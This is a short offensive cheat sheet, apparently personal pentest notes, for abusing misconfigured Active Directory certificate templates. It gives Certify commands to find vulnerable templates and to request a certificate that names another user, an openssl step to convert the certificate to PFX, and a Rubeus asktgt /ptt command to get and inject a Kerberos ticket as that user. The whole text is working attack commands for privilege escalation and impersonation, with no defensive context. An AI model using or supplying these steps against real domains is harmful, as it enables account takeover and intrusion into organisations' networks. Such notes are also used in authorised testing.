# source
https://github.com/GhostPack/Certify
https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Certify.ps1

# get information about certificate environment and find vulnerable certificates (enrollment rights)
Certify.exe find /vulnerable
# or 
Invoke-Certify -c "find /vulnerable"

# request certificate (altUser is the user to impersonate)
Certify.exe request /ca:"<fqdnCertificateServer>" /template:"<templateName>" /altname:"<altUser>"

# convert pem file to pfx file using linux
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <file>.pfx

# impersonate user
Rubeus.exe asktgt /user:<altUser> /certificate:<file>.pfx /ptt

